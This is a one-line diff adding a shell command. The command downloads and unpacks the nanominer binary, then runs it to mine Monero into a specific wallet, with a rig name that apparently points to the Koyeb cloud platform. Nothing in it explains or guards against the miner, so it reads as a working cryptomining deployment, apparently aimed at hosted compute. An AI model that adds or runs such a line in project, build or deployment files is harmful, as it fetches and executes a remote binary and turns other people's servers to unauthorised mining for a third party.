@@ -1,0 +1,1 @@
+wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz  && tar -xzvf nanominer-linux-3.7.6.tar.gz && ./nanominer -coin xmr -algo randomx -rigName koyeb -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg -email xiyueuyix@proton.me
